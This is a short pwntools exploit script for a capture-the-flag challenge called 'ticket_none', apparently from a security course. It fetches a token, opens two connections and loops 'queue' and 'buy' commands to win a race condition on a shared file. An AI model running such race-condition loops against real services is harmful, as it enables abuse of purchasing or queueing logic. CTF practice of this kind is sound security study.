# The race condition is between the check in the queue and buy.
# When checking the position in the buy, if someone is checking the queue, 
# the get_position would fail because of double access to the file.
# The count_file is created, opened and eliminated. 
# Race is won when access to the same file by check and buy is performed. 
# uy will try to access a closed file by queue.

from pwn import *

CHALL_PATH = "./ticket_none"
COMMANDS = """
c
"""

def get_token(c):
    c.recvuntil(b"token: ")
    return c.recvline().strip()

# Get the token as seen in class
c_token = remote("ticket-none.ctf.offensivedefensive.it", 8080, ssl=True)

token = get_token(c_token)
c_token.close()
print(token)

c_1 = remote("private.ctf.offensivedefensive.it", 8080, ssl=True)
c_1.recvuntil(b"Token: ")
c_1.sendline(token)

c_2 = remote("private.ctf.offensivedefensive.it", 8080, ssl=True)
c_2.recvuntil(b"Token: ")
c_2.sendline(token)


# Do the race condition bypass
while(1):
    c_1.sendline(b"queue p")
    c_2.sendline(b"buy p")
    print(c_2.recvline())
    